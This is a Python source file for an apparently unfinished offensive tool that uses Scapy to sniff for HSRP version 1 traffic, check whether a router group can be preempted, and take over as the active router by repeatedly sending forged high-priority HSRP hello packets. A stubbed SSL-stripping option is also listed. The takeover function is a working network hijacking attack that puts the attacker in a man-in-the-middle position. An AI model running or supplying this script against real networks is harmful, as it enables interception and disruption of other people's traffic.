'''
**to write tool desc**
Our tool will be focusing on HSRP version 1.

Functions:
- sniff 
    -- able to sniff the network and look for presence of HSRP 
    -- able to detect if the current configuration of HSRP is vulnerable
    -- able to retrieve details of current HSRP configuration

- takeover as active HSRP router
    -- allows the attacking machine to takeover as the active HSRP router, using one of the 2 configurations
        -> default (use values in Packet class)
        -> user-supplied variables

- sslstrip
    -- ?

'''

from scapy.all import *
from argparse import ArgumentParser, Action
from colorama import init, Fore
from ipaddress import IPv4Address

# coloura initialization
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

# define default HSRP values
IFACE = 'eth0'
MAL_IP = '10.10.3.254'
VERSION = {'224.0.0.2':'1', '224.0.0.102':'2'}

class Packet:
    port = 1985
    multicast_ip = '224.0.0.2' 
    auth = 'cisco'
    src_ip = '10.10.3.20'
    virtual_ip = '10.10.3.1'
    priority = 255
    hello_int = 3
    hold_time = 10
    group = 1



def args():
    parser = ArgumentParser()

    parser.add_argument('--sniff', action='store_true', help='Sniff the network for HSRP packets and check if its vulnerable to HSRP hijacking')
    
    subparser = parser.add_subparsers(dest='command')
    takeover = subparser.add_parser('takeover', help='Hijack HSRP and takeover as active router')
    takeover.add_argument('--version', nargs='?', type=int, const=1, default=1, help="Sets the HSRP version. Default is 1")
    takeover.add_argument('--src_ip', nargs='?', type=str, help='Set the source IP address of malicious HSRP packet')
    takeover.add_argument('--group', nargs='?', type=int, help='Set group of HSRP that will be attacked')
    takeover.add_argument('--auth', nargs='?', type=str, help='Set the authentication key to be used')

    parser.add_argument('--sslstrip', action='store_true', help='Conduct SSL Stripping attack')

    return parser.parse_args()



# sniff the network for presence of HSRP packets
def sniff_network():
    print(f"{GREEN}[+] {RESET} Starting HSRP sniffing...")
    sniff(timeout=10, iface=IFACE, filter="udp src port 1985 and udp dst port 1985", prn=process_pkt)



# check if HSRP config is vulnerable - i.e. priority < 255 / attacking ip addr higher than active router ip addr
def check_vulnerable(pkt):
    priority = pkt[HSRP].priority
    src_ip = pkt[IP].src

    if priority < 255 or IPv4Address(MAL_IP) > IPv4Address(src_ip):
        return True
    return False



def process_pkt(pkt):
    if pkt.haslayer(HSRP):
        # if state of HSRP is Active and its vulnerable
        if pkt[HSRP].state == 16 and check_vulnerable(pkt):
            print(
            f"\n\nHSRP version - {VERSION[pkt[IP].dst]}\n"+
            f"Group number - {pkt[HSRP].group}\n"+
            f"Source IP - {pkt[IP].src}\n"+
            f"Virtual IP - {pkt[HSRP].virtualIP}\n"+
            f"Priority - {pkt[HSRP].priority}\n"+
            "Vulnerable - Yes")
            return None  
    else:
        return ""
    


# attempt to take over as Active HSRP router
def hsrp_v1(pkt):
    ip = IP(src=pkt.src_ip,dst=pkt.multicast_ip)
    udp = UDP(sport=pkt.port,dport=pkt.port)
    hsrp = HSRP(group=pkt.group,priority=pkt.priority,virtualIP=pkt.virtual_ip)
    print(f"{GREEN} [+] {RESET} Attempting HSRP takeover")
    send(ip/udp/hsrp, iface='eth0', inter=3, loop=1)

    # maybe can multithread run sniff_network() function to check if active router is attacker? can do later



def main():
    arg = args()
    mal_pkt = Packet()

    if arg.sniff:
        sniff_network()
    elif arg.command == 'takeover':
        if arg.version == 1:
            if arg.src_ip != None: mal_pkt.src_ip = arg.src_ip
            if arg.group != None: mal_pkt.group = arg.group
            if arg.auth != None: mal_pkt.auth = arg.auth
            hsrp_v1(mal_pkt)
        elif arg.version == 2:
            print("currently not supported")

    elif arg.sslstrip:
        print('ssltripthnxkeith:)')



if __name__ == '__main__':
    main()


